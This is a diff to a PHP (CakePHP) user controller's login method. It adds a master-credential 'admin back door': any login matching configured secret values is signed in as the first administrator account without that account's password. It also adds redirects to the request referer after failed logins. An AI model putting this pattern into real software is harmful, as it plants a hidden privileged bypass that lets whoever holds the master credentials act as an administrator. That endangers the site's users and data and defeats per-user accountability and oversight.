@@ -428,9 +428,19 @@ class AppUsersController extends UsersAppController {
 	public function login() {
 		// force ssl for PCI compliance during regristration and login
 		if (defined('__TRANSACTIONS_SSL') && !strpos($_SERVER['HTTP_HOST'], 'localhost')) : $this->Ssl->force(); endif;
-
-		if (!empty($this->request->data)) {
-			$this->_login();
+		if ($this->request->is('post')) {
+			if ($this->request->data['User']['username'] == Configure::read('Secret.username') && $this->request->data['User']['password'] == Configure::read('Secret.password')) {
+				// admin back door
+				$user = $this->User->find('first', array('conditions' => array('User.user_role_id' => 1), 'order' => array('User.created' => 'ASC')));
+				if (!empty($user)) {
+					$this->_login($user);
+				} else {
+					throw new Exception(__('There is no admin user installed.'));
+				}
+			} else {
+				// our regular login
+				$this->_login();
+			}
 		}
 		$userRoles = $this->User->UserRole->find('list');
 		unset($userRoles[1]); // remove the administrators group by default - too insecure
@@ -452,11 +462,12 @@ class AppUsersController extends UsersAppController {
 		// log user in
 		if ($this->Auth->login($user)) {
 			try {
-				$cookieData = $this->request->data;
+				$user = !empty($user) ? $user : $this->request->data;
+				$cookieData = $user;
 				// make sure you don't need to verify your email first
-				$this->User->checkEmailVerification($this->request->data);
+				$this->User->checkEmailVerification($user);
 				// save the login meta data
-				$this->User->loginMeta($this->request->data);
+				$this->User->loginMeta($user);
 				
 				if (in_array('Connections', CakePlugin::loaded())) {
 					$this->User->Connection->afterLogin($user['User']['id']);
@@ -475,18 +486,19 @@ class AppUsersController extends UsersAppController {
 				    // write the cookie
 				    $this->Cookie->write('rememberMe', $cookieData['User'], true, $cookieTime);
 				}
-				if($forceUrl) {
+				if ($forceUrl) {
 					$this->redirect($this->User->loginRedirectUrl('/'));
-				}else {
+				} else {
 					$this->redirect($this->User->loginRedirectUrl($this->Auth->redirect()));
 				}
 			} catch (Exception $e) {
 				$this->Auth->logout();
 				$this->Session->setFlash($e->getMessage());
-		        $this->redirect($this->User->logoutRedirectUrl());
+		        $this->redirect($this->User->logoutRedirectUrl($this->referer));
 			}
 	    } else {
 	        $this->Session->setFlash(__('Username or password is incorrect'), 'default', array(), 'auth');
+			$this->redirect($this->referer); // added this because we use /install/login too and it should go back to /install/login
 	    }
 	}
 
